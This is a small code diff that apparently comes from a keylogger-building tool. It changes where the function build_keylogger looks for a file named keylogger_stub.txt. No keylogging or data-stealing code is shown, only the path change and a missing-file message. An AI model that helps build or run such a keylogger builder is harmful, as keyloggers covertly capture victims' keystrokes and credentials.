@@ -13,7 +13,7 @@ from core.display import get_inpt, Colorate, Theme
 
 def build_keylogger():
     cl = Theme.get_colors()
-    sp = os.path.join("modules", "keylogger_stub.txt")
+    sp = os.path.join("modules/stub/", "keylogger_stub.txt")
     if not os.path.exists(sp):
         print(Colorate.Horizontal(cl["num"], "  [!] Missing keylogger_stub.txt"))
         return
